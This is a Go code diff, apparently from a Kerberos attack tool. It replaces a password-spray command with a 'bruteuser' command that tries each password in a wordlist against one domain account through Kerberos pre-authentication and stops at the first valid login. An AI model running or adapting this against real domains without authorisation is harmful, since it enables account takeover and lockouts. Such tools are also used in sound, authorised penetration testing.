@@ -9,31 +9,28 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var usernameList string
-var password string
-
-var passwordSprayCmd = &cobra.Command{
-	Use:   "passwordspray [flags] <username_wordlist> <password>",
-	Short: "Test a single password against a list of users",
-	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
+// bruteuserCmd represents the bruteuser command
+var bruteuserCmd = &cobra.Command{
+	Use:   "bruteuser [flags] <password_list> username",
+	Short: "Bruteforce a single user's password from a wordlist",
+	Long: `Will perform a password bruteforce against a single domain user using Kerberos Pre-Authentication by requesting at TGT from the KDC.
 If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
 A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
-Succesful logins will be displayed on stdout.
-WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
+WARNING: only run this if there's no lockout policy!`,
 	Args:   cobra.ExactArgs(2),
 	PreRun: setupSession,
-	Run:    passwordSpray,
+	Run:    bruteForce,
 }
 
 func init() {
-	rootCmd.AddCommand(passwordSprayCmd)
+	rootCmd.AddCommand(bruteuserCmd)
 }
 
-func passwordSpray(cmd *cobra.Command, args []string) {
-	usernamelist := args[0]
-	password := args[1]
+func bruteForce(cmd *cobra.Command, args []string) {
+	passwordlist := args[0]
+	username := args[1]
 
-	file, err := os.Open(usernamelist)
+	file, err := os.Open(passwordlist)
 	if err != nil {
 		Log.Error(err.Error())
 		return
@@ -42,16 +39,16 @@ func passwordSpray(cmd *cobra.Command, args []string) {
 
 	scanner := bufio.NewScanner(file)
 
-	var username string
-	count, success := 0, 0
+	var password string
+	count := 0
 	start := time.Now()
 	for scanner.Scan() {
 		count++
-		username = scanner.Text()
+		password = scanner.Text()
 		login := fmt.Sprintf("%v@%v", username, Domain)
 		if ok, err := KSession.TestLogin(username, password); ok {
-			success++
-			Log.Noticef("[+] VALID LOGIN:\t %s : %s", login, password)
+			Log.Notice("[+] VALID LOGIN:\t %s : %s", login, password)
+			break
 		} else {
 			// This is to determine if the error is "okay" or if we should abort everything
 			ok, errorString := KSession.HandleKerbError(err)
@@ -62,8 +59,7 @@ func passwordSpray(cmd *cobra.Command, args []string) {
 			Log.Debugf("[!] %v - %v", login, errorString)
 		}
 	}
-
-	Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", count, success, time.Since(start).Seconds())
+	Log.Infof("Done! Tested %d passwords in %.3f seconds", count, time.Since(start).Seconds())
 
 	if err := scanner.Err(); err != nil {
 		Log.Error(err.Error())
